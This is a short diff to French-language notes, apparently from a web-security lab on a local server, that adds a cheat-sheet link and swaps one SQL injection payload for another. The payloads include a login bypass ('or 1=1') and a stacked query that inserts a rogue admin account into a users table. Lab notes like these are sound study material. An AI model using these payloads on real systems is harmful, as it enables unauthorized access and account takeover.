@@ -46,6 +46,7 @@ http://127.0.0.8:8000
 `' or 1=1 -- `
 
 > Ne pas oublier l'espace à la fin
+> https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#ByPassingLoginScreens
 
 ## Enumération des utilisateurs
 
@@ -53,7 +54,7 @@ http://127.0.0.8:8000
 
 ## Insertion d'un utilisateur dans la table users
 
-`' or 1=1 UNION SELECT 'admin', 'admin', 'admin', 'admin' -- `
+`admin'; INSERT INTO users (password, username, id, email, admin) VALUES ('root', 'root', 7, 'hacker@fenelon.com', "true");`
 
 # SQLMap
 
